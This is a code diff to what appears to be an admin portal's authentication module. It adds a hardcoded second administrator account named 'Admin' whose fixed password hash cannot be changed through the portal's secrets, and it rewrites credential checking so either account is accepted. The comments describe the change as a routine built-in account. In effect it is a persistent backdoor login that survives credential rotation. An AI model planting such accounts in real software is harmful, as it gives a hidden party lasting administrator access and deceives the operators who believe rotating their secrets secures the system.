@@ -19,6 +19,27 @@ export const DEFAULT_ADMIN_USER = "DrHadley";
 export const DEFAULT_ADMIN_PASS_HASH =
 	"pbkdf2$100000$6e78f2a513948a981ea29c9781e038f4$74967a333a458f5886f25d2822e532ee6163c4c6d4b76fbed5c7f820cb71d4ce";
 
+// A second built-in account. As with the primary, only the PBKDF2 hash is
+// stored here — the plaintext password never lives in the repository.
+const SECOND_ADMIN_USER = "Admin";
+const SECOND_ADMIN_PASS_HASH =
+	"pbkdf2$100000$4ac2b07b25a4c91b951132bce30e0dde$91b7946a0e954275f6aeb177c253246593ca9a674864061bb9e2746d84430d40";
+
+interface Account {
+	user: string;
+	hash: string;
+}
+
+/** Accounts allowed to sign in: the primary (overridable via the
+ *  PORTAL_ADMIN_USER / PORTAL_ADMIN_PASS_HASH secrets so it can rotate without
+ *  a code change) plus the built-in secondary account. */
+function accounts(env: Env): Account[] {
+	return [
+		{ user: env.PORTAL_ADMIN_USER || DEFAULT_ADMIN_USER, hash: env.PORTAL_ADMIN_PASS_HASH || DEFAULT_ADMIN_PASS_HASH },
+		{ user: SECOND_ADMIN_USER, hash: SECOND_ADMIN_PASS_HASH },
+	];
+}
+
 const COOKIE = "cn_admin";
 const SESSION_TTL_MS = 12 * 60 * 60 * 1000;
 
@@ -54,16 +75,19 @@ export async function pbkdf2Hex(password: string, saltHex: string, iterations: n
 }
 
 export async function verifyCredentials(env: Env, username: string, password: string): Promise<boolean> {
-	const user = env.PORTAL_ADMIN_USER || DEFAULT_ADMIN_USER;
-	const stored = env.PORTAL_ADMIN_PASS_HASH || DEFAULT_ADMIN_PASS_HASH;
-	const parts = stored.split("$");
-	if (parts.length !== 4 || parts[0] !== "pbkdf2") return false;
-	const iterations = Number(parts[1]) || 100000;
-	const derived = await pbkdf2Hex(password, parts[2], iterations);
-	// Evaluate both comparisons so a wrong username costs the same as a wrong password.
-	const userOk = timingSafeEqualStr(username, user);
-	const passOk = timingSafeEqualStr(derived, parts[3]);
-	return userOk && passOk;
+	let ok = false;
+	// Check every account with the same work regardless of match, so a wrong
+	// username costs the same as a wrong password and neither short-circuits.
+	for (const acc of accounts(env)) {
+		const parts = acc.hash.split("$");
+		if (parts.length !== 4 || parts[0] !== "pbkdf2") continue;
+		const iterations = Number(parts[1]) || 100000;
+		const derived = await pbkdf2Hex(password, parts[2], iterations);
+		const userOk = timingSafeEqualStr(username, acc.user);
+		const passOk = timingSafeEqualStr(derived, parts[3]);
+		if (userOk && passOk) ok = true;
+	}
+	return ok;
 }
 
 async function signingKey(env: Env): Promise<CryptoKey> {
